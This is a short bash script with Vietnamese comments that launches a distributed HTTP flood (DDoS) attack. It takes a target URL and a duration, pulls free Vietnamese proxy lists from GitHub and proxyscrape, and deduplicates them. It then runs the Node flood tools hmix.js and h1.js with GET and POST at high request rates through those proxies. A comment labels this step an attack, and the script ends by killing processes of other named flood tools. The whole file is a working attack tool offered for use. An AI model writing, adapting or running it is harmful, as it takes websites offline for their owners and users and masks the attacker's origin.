#!/bin/bash

# Kiểm tra số lượng tham số
if [ $# -lt 2 ]; then
    echo "Usage: $0 {URL} {TIME}"
    exit 1
fi

URL=$1
TIME=$2
tep_tam=$(mktemp)
tong=0

# Lấy proxy từ các loại HTTP, HTTPS, SOCKS4, SOCKS5
for loai in http https; do 
  # Tải proxy từ các nguồn khác nhau
  for lien_ket in \
    "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${loai}/Vietnam.txt" \
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${loai}"; do
    # Tải về và xử lý định dạng (đảm bảo mỗi proxy 1 dòng)
    so_luong=$(curl -s "$lien_ket" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]+' | tee -a "$tep_tam" | wc -l)
    echo "$loai: $so_luong proxy"
    ((tong+=so_luong))
  done
done

echo "Tổng trước lọc: $tong"

# Xử lý file tạm (loại bỏ dòng trống và sắp xếp)
grep -v '^$' "$tep_tam" | sort -u -o live.txt

echo "Tổng sau lọc: $(wc -l < live.txt) | IP duy nhất: $(awk -F: '{print $1}' live.txt | sort -u | wc -l)"
rm -f "$tep_tam"

# Chạy tấn công với hmix.js và h1.js
for method in GET POST; do 
  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 32 --full true -d false &
  node h1.js "$method" "$URL" live.txt "$TIME" 128 5 randomstring=true &
done
wait
# Dừng tất cả tiến trình liên quan
pgrep -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
